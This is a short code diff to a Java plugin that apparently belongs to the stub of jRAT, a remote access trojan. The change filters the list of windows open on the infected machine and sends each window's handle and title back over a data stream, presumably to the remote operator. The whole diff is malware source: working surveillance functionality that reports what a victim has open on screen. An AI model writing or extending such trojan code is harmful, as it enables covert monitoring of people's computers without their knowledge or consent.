@@ -2,6 +2,7 @@ package se.jrat.plugin.window.stub;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.util.ArrayList;
 import java.util.List;
 
 import jrat.api.stub.StubPlugin;
@@ -37,11 +38,18 @@ public class WindowPlugin extends StubPlugin {
 			dos.writeByte(HEADER_LIST);
 			
 			List<NativeWindow> windows = WindowUtils.getWindows();
+			List<NativeWindow> sendWindows = new ArrayList<NativeWindow>();
 			
-			dos.writeInt(windows.size());
+			for (NativeWindow window : windows) {
+				if (!window.isVisible() || window.isVisible() && window.getTitle().length() > 0) {
+					sendWindows.add(window);
+				}
+			}
 			
-			for (int i = 0; i < windows.size(); i++) {
-				NativeWindow window = windows.get(i);
+			dos.writeInt(sendWindows.size());
+			
+			for (int i = 0; i < sendWindows.size(); i++) {
+				NativeWindow window = sendWindows.get(i);
 				
 				dos.writeInt(window.getHwnd());
 				writeString(window.getTitle());
